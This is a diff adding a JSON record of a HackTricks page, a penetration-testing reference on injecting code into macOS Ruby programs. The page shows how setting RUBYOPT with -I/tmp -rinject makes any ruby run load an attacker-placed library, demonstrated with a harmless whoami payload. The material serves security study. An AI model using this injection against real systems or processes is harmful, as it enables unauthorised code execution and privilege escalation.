@@ -1,0 +1,7 @@
+{
+    "url": "https://book.hacktricks.xyz/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ruby-applications-injection",
+    "title": "macos-ruby-applications-injection",
+    "category": "src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse",
+    "source": "HackTricks",
+    "content": "# macOS Ruby Applications Injection\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## RUBYOPT\n\nUsing this env variable it's possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`** cannot be used to specify ruby code to execute, it's possible to use the params **`-I`** and **`-r`** to add a new folder to the libraries to load path and then **specify a library to load**.\n\nCreate the library **`inject.rb`** in **`/tmp`**:\n\n```ruby:inject.rb\nputs `whoami`\n```\n\nCreate anywahere a ruby script like:\n\n```ruby:hello.rb\nputs 'Hello, World!'\n```\n\nThen make an arbitrary ruby script load it with:\n\n```bash\nRUBYOPT=\"-I/tmp -rinject\" ruby hello.rb\n```\n\nFun fact, it works even with param **`--disable-rubyopt`**:\n\n```bash\nRUBYOPT=\"-I/tmp -rinject\" ruby hello.rb --disable-rubyopt\n```\n\n{{#include ../../../banners/hacktricks-training.md}}"
+}
